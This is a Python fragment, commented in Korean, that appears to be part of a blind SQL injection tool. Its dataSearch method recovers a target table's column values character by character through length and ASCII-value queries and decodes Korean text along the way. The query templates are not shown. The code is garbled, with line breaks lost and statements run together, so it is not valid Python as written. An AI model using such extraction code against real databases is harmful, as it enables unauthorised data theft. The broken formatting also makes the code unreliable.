# 데이터 조회 함수 
def dataSearch(self,columnName,tableName,type,count,start): 
    word = "" if start != 1: startNum = start else: startNum = 1 
    for i in range(startNum, count + 1): 
        query = self.lenQuery[type].format(columnName,columnName,tableName) + str(i) length = self.exponentialSearch(query) 
        for j in range(1, length + 1): 
            query = self.wordQuery[type].format(columnName,j,columnName,tableName,i) 
            asciiCharacter = self.exponentialSearch(query) 
            if asciiCharacter > 127: 
                hexAsciiCharacter = hex(asciiCharacter) 
                hexAsciiCharacter = hexAsciiCharacter.replace("0x","") 
                encodeHangeul=self.insertPersent(str(hexAsciiCharacter)) 
                hanguel = parse.unquote(encodeHangeul) 
                word += hanguel 
            else: character = chr(asciiCharacter) word += character print(i,":",word) self.dataWordList.append(word) word=""
    
def insertPersent(self,s): return '%'+s[:2]+'%'+s[2:4]+'%'+s[4:6]